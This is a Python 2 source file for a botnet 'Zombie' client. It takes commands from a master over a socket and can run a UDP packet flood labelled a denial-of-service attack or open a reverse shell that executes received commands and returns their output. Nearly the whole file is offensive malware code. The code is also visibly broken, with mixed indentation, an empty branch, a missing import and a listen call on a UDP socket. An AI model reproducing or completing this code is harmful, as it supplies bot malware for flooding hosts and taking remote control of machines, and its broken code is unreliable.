import sys
import socket
import subprocess


class Zombie:

	def __init__(self,conn):
		self.conn = conn


	#Denial of Service Attack
	def dos(self,dest_ip,dest_port):

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
			print "dos connected..."
		except socket.error, msg :
			print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
			return

		print "starting dos..."
		for i in xrange(10):
			sock.sendto("SPAM",(dest_ip,dest_port))						#Send packets

		print "dos finished..."
		sock.close()													#Close socket

	#Reverse Shell
	def reverse_shell(self):

		self.conn.sendall("Starting reverse shell...\n")

		while True:
			cmd = self.conn.recv(1024)				#Receive shell command
			if cmd == 'exit':					#Break if user wished to exit
				self.conn.sendall("Exiting...\n")
				break

			# do shell command
            new_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # read output
            stdout_value = new_process.stdout.read() + new_process.stderr.read()
            # send back output
            self.conn.sendall(stdout_value)


	def parse_cmd(self,p):
		# packet = conn.recv(1024)
		packet = p.split('\r\n')

		#packet = "DDOS\r\nDEST_IP\r\nDEST_PORT\r\n"
		if packet[0] == "DDOS":
			self.dos(packet[1],packet[2])

		elif packet[0] == "SPAM":


		#packet  = "RVSH\r\n"
		elif packet[0] == "RVSH":
			self.conn.sendall("RVSH\n")				#Tell master to start sending commands
			self.reverse_shell()


		# conn.close()









if __name__ == '__main__':

	MASTER_IP = "127.0.0.1"
	MASTER_PORT = 6000

	try:
		# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Create socket
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
		s.bind((MASTER_IP,MASTER_PORT))								#Bind to port
		s.listen(5)													#Listen 
		print 'Socket created'
	except socket.error, msg :
	    print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
	    sys.exit()

	
	zomb = Zombie(s)
	while True:
		#Receive command
		data, addr = zomb.conn.recvfrom(1024)
		print "reveived: " + data + " from: " + addr
		# conn, addr = s.accept()
		if addr == MASTER_IP:
			#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
    		# start_new_thread(zomb.parse_cmd ,(conn,))
    		start_new_thread(zomb.parse_cmd ,(data,))
    	# else:
    	# 	conn.close()


    zomb.conn.close()
